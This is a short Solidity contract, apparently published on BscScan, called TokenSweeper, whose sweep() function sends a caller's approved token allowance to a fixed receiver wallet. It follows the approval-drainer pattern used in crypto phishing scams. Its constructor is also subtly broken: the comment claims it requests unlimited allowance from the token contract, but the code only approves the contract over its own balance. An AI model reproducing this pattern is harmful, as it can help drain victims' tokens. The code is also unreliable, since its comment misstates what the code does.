/**
 *Submitted for verification at BscScan.com on 2023-03-31
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;

interface ERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TokenSweeper {
    
    address public receiverWallet;
    ERC20 public token;
    
    constructor(address _tokenAddress, address _receiverWallet) {
        token = ERC20(_tokenAddress);
        receiverWallet = _receiverWallet;
        
        // Request unlimited allowance from the token contract
        token.approve(address(this), type(uint256).max);
    }
    
    function sweep() public {
        uint256 balance = token.allowance(msg.sender, address(this));
        token.transferFrom(msg.sender, receiverWallet, balance);
    }
}